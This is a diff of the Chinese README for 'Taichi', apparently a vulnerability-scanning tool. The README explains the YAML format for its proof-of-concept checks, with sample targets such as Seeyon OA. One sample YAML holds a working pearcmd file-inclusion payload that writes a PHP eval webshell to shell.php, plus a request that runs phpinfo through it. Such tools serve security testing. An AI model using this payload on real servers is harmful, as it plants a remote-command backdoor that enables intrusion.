@@ -32,13 +32,18 @@
 - 增加status参数
 - 新增通达OA poc
 
+**2023.3.29**
+
+- 删除 `http://`
+- 优化文档
+
 # 前言
 
 开发这款工具的目的是为了让安全从业者，刚接触安全初学者更快编写poc。当然，我也知道有nuclei这样成熟好用的工具，但是自己动手丰衣足食，所以这款工具就诞生了。（大佬勿喷）
 
 目前poc以及程序测试不多（有的漏洞几乎找不到了），为了提高效率，我一直在增加poc，所以可能会有较多bug，请见谅。
 
-发现bug或者有建议欢迎联系我。
+**发现bug或者有建议欢迎联系我，我会尽我所能满足各位的要求。**
 
 # 介绍
 
@@ -72,8 +77,8 @@ options:
 ### 扫描单个目标
 
 ```
-python3 Taichi.py -rh 123.123.123.123 -p poc.yaml
-python3 Taichi.py -rh 123.123.123.123 -a /root/Taichi/pocs
+python3 Taichi.py -rh https://123.123.123.123 -p poc.yaml
+python3 Taichi.py -rh https://123.123.123.123 -a /root/Taichi/pocs
 ```
 
 ### 扫描多个目标
@@ -103,11 +108,13 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 |--------- pocs(poc文件)
 ```
 
-## 两种yaml格式
+## yaml格式
 
 **注意：yaml文件中参数的位置不可以改变**
 
-### 第一种poc.yaml格式
+**实际上yaml都是一样的，我这里列出了四种不同情况供大家参考**
+
+### 第一种情况yaml格式
 
 ```
 #poc名称
@@ -135,11 +142,11 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
   - word:
       - "8f14e45fceea167a5a36dedd4bea254"
 
-#验证是否攻击成功的 请求方式
+#第二次访问的 请求方式
 - method-V:
   - method: "isNone"
 
-#webshell位置
+#第二次访问的url位置
 - verify:
   - verify : "isNone"
 
@@ -156,6 +163,10 @@ poc名称，用于扫描时显示
 
 reques的方式，根据自己需求来定
 
+#### url
+
+因为我在采用了url+<拼接内容>这样的方法来访问url，例如：http://192.168.0.1/a/b/b.jsp，就要把/a/b/b.jsp填入url参数
+
 #### payload
 
 顾名思义就是payload
@@ -167,14 +178,6 @@ response包里的状态码，根据burp的poc填写
 #### word
 
 response包里的关键字，目前只能写一个，根据burp的poc填写
-
-#### response
-
-response包的关键词，用于判断漏洞是否存在，目前只可以支持一个参数
-
-#### url
-
-因为我在采用了url+<拼接内容>这样的方法来访问url，例如：http://192.168.0.1/a/b/b.jsp，就要把/a/b/b.jsp填入url参数
 
 #### method-V
 
@@ -200,7 +203,9 @@ response包的关键词，用于判断漏洞是否存在，目前只可以支持
 "isNone"
 ```
 
-### 第二种poc.yaml格式
+### **以下就只介绍和不一样的地方**
+
+### 第二种情况yaml格式
 
 ```
 #poc名称
@@ -211,39 +216,41 @@ response包的关键词，用于判断漏洞是否存在，目前只可以支持
 - method:
   - method: "post"
 
+#漏洞的位置
+- url:
+  - url : "/public/index.php"
+
 #payload
 - payload:
   - payload: "lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"
+
+#response包里状态码
+- status:
+  - status: "200"
 
 #response包里的关键字
 - word:
   - word:
       - "php_dir"
 
-#漏洞的位置
-- url:
-  - url : "/public/index.php"
-
-#attack中 验证 是否攻击成功的 请求方式
+#第二次访问的 请求方式
 - method-V:
   - method: "get"
 
-#webshell位置
+#第二次访问的url位置
 - verify:
   - verify : "/shell.php?cmd=phpinfo();"
-  
+
 #cmd 为了适配Java反序列化漏洞
 - cmd:
   - cmd : "isNone"
 ```
 
-这里就只介绍和不一样的地方
-
 **二次访问：字面意思就是第二次访问，因为有的漏洞上传webshell，需要访问webshell证明漏洞存在，就要进行二次访问webshell**
 
-#### response
+#### word
 
-response包的关键词，这里的关键字是**二次请求**response包的关键字，用于判断漏洞是否存在，目前只可以支持一个参数
+response包的关键词，这里的关键字是**二次请求**response包的关键字，也就是说word始终是最后一个response包的关键字。用于判断漏洞是否存在，目前只可以支持一个参数
 
 #### method-V
 
@@ -253,7 +260,7 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 
 这个地方就是上面说的二次访问验证webshell的地方，如果你传了webshell，这个地方就填入你webshell的路径，例如：http://192.168.0.1/a/b/b.jsp，那这个地方就填入/a/b/b.jsp
 
-## 第三种yaml格式
+### 第三种情况yaml格式
 
 ```
 #poc名称
@@ -263,6 +270,10 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 #请求方式
 - method:
   - method: "get"
+
+#漏洞的位置
+- url:
+  - url : "/seeyon/management/status.jsp"
 
 #payload
 - payload:
@@ -277,15 +288,11 @@ response包的关键词，这里的关键字是**二次请求**response包的关
   - word:
       - "OS"
 
-#漏洞的位置
-- url:
-  - url : "/seeyon/management/status.jsp"
-
-#验证是否攻击成功的 请求方式
+#第二次访问的 请求方式
 - method-V:
   - method: "isNone"
 
-#webshell位置
+#第二次访问的url位置
 - verify:
   - verify : "isNone"
 
@@ -302,7 +309,7 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 
 这种无payload，信息泄露用这种较多
 
-## 第四种yaml格式
+### 第四种情况yaml格式
 
 ```
 #poc名称
@@ -312,6 +319,10 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 #请求方式
 - method:
   - method: "post"
+  
+#漏洞的位置
+- url:
+  - url : "/seeyon/main.do?method=changeLocale"
 
 #payload
 - payload:
@@ -326,15 +337,11 @@ response包的关键词，这里的关键字是**二次请求**response包的关
   - word:
       - "root"
 
-#漏洞的位置
-- url:
-  - url : "/seeyon/main.do?method=changeLocale"
-
-#验证是否攻击成功的 请求方式
+#第二次访问的 请求方式
 - method-V:
   - method: "isNone"
 
-#webshell位置
+#第二次访问的url位置
 - verify:
   - verify : "isNone"
 
